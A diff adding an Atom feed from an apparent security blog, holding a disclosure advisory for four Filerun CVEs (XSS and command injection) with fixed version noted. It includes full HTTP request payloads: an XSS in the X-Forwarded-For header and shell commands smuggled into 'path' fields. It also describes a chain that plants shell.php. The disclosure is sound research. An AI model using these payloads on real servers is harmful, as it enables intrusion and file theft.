@@ -1,0 +1,221 @@
+<?xml version="1.0" encoding="utf-8"?>
+
+<feed xmlns="http://www.w3.org/2005/Atom" >
+  <generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator>
+  <link href="/author/chris/feed.xml" rel="self" type="application/atom+xml" />
+  <link href="/" rel="alternate" type="text/html" />
+  <updated>2021-10-06T05:52:37+00:00</updated>
+  <id>/author/chris/feed.xml</id>
+
+  
+  
+  
+
+  
+    <title type="html">syntegris security blog | </title>
+  
+
+  
+    <subtitle>Security Blog</subtitle>
+  
+
+  
+
+  
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+
+  
+  
+
+  
+    <entry>
+      <title type="html">Advisory for Filerun &amp;lt;= 2021.03.26</title>
+      <link href="/filerun-advisory" rel="alternate" type="text/html" title="Advisory for Filerun &lt;= 2021.03.26" />
+      <published>2021-09-23T10:00:00+00:00</published>
+      <updated>2021-09-23T10:00:00+00:00</updated>
+      <id>/filerun-advisory</id>
+      <content type="html" xml:base="/filerun-advisory">&lt;p&gt;We discovered multiple vulnerabilities in &lt;a href=&quot;https://filerun.com&quot;&gt;Filerun&lt;/a&gt; &amp;lt;= 2021.03.26.
+The vulnerabilities were fixed in Filerun 2021.06.27.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;CVE ID&lt;/th&gt;
+      &lt;th&gt;Type&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CVE-2021-35503&lt;/td&gt;
+      &lt;td&gt;Stored Cross-Site-Scripting (unauthenticated) in HTTP header&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CVE-2021-35504&lt;/td&gt;
+      &lt;td&gt;Remote Code Execution (authenticated) using &lt;em&gt;checkFFmpeg&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CVE-2021-35505&lt;/td&gt;
+      &lt;td&gt;Remote Code Execution (authenticated) using &lt;em&gt;checkImageMagick&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CVE-2021-35506&lt;/td&gt;
+      &lt;td&gt;Stored Cross-Site-Scripting (authenticated) in HTML-Editor&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;cve-2021-35503&quot;&gt;CVE-2021-35503&lt;/h2&gt;
+&lt;p&gt;Sending a malicious &lt;em&gt;X-Forwarded-For&lt;/em&gt; header results in a stored XSS in the activity logs. 
+The code is triggered if an admin views or archives the logs.
+Filerun blocks brute force attacks. To prevent account lock out, use a non-existent username.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?module=fileman&amp;amp;page=login&amp;amp;action=login HTTP/1.1
+Host: localhost
+Content-Length: 66
+Cache-Control: max-age=0
+sec-ch-ua: &quot;Chromium&quot;;v=&quot;91&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: iframe
+Referer: http://localhost/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+X-Forwarded-For: &amp;lt;iMg onerror=alert(1) src=a&amp;gt;
+Cookie: FileRunSID=a99a9ba3867833fd1af9b6549eb83524
+Connection: close
+
+username=filerun&amp;amp;password=password&amp;amp;otp=&amp;amp;two_step_secret=&amp;amp;language=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The severity can be summarized as critical.&lt;/p&gt;
+
+&lt;p&gt;An unauthenticated remote attacker will gain access to all files of all users. 
+He could edit the files or put the application in maintenance mode, which would impact availability.
+He could become an administrator user by stealing sessions or exploit other vulnerabilities in this Filerun version.&lt;/p&gt;
+
+&lt;h2 id=&quot;cve-2021-35504&quot;&gt;CVE-2021-35504&lt;/h2&gt;
+&lt;p&gt;An attacker with access to the admin backend can abuse the &lt;em&gt;checkFFmpeg&lt;/em&gt; action to trigger code execution in the context of the webserver user.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?module=cpanel&amp;amp;section=settings&amp;amp;page=image_preview&amp;amp;action=checkFFmpeg HTTP/1.1
+Host: localhost
+Content-Length: 29
+sec-ch-ua: &quot;Chromium&quot;;v=&quot;91&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: */*
+Origin: http://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/?module=cpanel
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: FileRunSID=887bebeb478e22731a2cabdeb0cf876e
+Connection: close
+
+path=ffmpeg%7Cecho%20%60ls%60
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The severity can be summarized as high.&lt;/p&gt;
+
+&lt;p&gt;The attacker requires access to a higher privileged account of the application (e.g. through &lt;em&gt;CVE-2021-35503&lt;/em&gt;).
+He/She is able to escalate their privileges to the context of the web server user.&lt;/p&gt;
+
+&lt;h2 id=&quot;cve-2021-35505&quot;&gt;CVE-2021-35505&lt;/h2&gt;
+&lt;p&gt;An attacker with access to the admin backend can abuse the &lt;em&gt;checkImageMagick&lt;/em&gt; action to trigger code execution in the context of the webserver user.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?module=cpanel&amp;amp;section=settings&amp;amp;page=image_preview&amp;amp;action=checkImageMagick HTTP/1.1
+Host: localhost
+Content-Length: 40
+sec-ch-ua: &quot;Chromium&quot;;v=&quot;91&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: */*
+Origin: http://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/?module=cpanel
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: FileRunSID=887bebeb478e22731a2cabdeb0cf876e
+Connection: close
+
+mode=exec&amp;amp;path=convert%7Cecho%20%60ls%60
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The severity can be summarized as high.&lt;/p&gt;
+
+&lt;p&gt;The attacker requires access to a higher privileged account of the application (e.g. through &lt;em&gt;CVE-2021-35503&lt;/em&gt;).
+He/She is able to escalate their privileges to the context of the web server user.&lt;/p&gt;
+
+&lt;h2 id=&quot;cve-2021-35506&quot;&gt;CVE-2021-35506&lt;/h2&gt;
+&lt;p&gt;An attacker can upload an HTML file with malicious javascript code. The code is executes when a user views or edits this file using the HTML-Editor.&lt;/p&gt;
+
+&lt;p&gt;The severity can be summarized as critical.&lt;/p&gt;
+
+&lt;p&gt;A low privileged attacker will gain access to all files of all users. He could edit the files or put the application in
+maintenance mode, which would impact availability. He could become an administrator user by stealing sessions (or trigger &lt;em&gt;CVE-2021-35504&lt;/em&gt; or &lt;em&gt;CVE-2021-35505&lt;/em&gt;).&lt;/p&gt;
+
+&lt;h2 id=&quot;exploit-chain&quot;&gt;Exploit Chain&lt;/h2&gt;
+&lt;p&gt;We published a &lt;a href=&quot;https://www.exploit-db.com/exploits/50313&quot;&gt;Proof of Concept&lt;/a&gt; that exploits &lt;em&gt;CVE-2021-35503&lt;/em&gt; and &lt;em&gt;CVE-2021-35505&lt;/em&gt;.
+The code injects Javascript into the Activity Log Feed, that triggers the Remote Code Execution as soon as the administrator visits the page.
+This will upload a &lt;em&gt;shell.php&lt;/em&gt; file in the web root.&lt;/p&gt;
+
+&lt;h2 id=&quot;demo&quot;&gt;Demo&lt;/h2&gt;
+&lt;video muted=&quot;&quot; controls=&quot;&quot; src=&quot;assets/filerun.2021.35503.and.35505.small.mp4&quot;&gt;&lt;/video&gt;
+
+&lt;p&gt;&lt;strong&gt;Thanks to the Filerun team to address these findings immediately.&lt;/strong&gt;&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Chris</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="advisory" />
+      
+
+      
+        <summary type="html">We discovered multiple vulnerabilities in Filerun &amp;lt;= 2021.03.26. The vulnerabilities were fixed in Filerun 2021.06.27.</summary>
+      
+
+      
+      
+    </entry>
+  
+</feed>
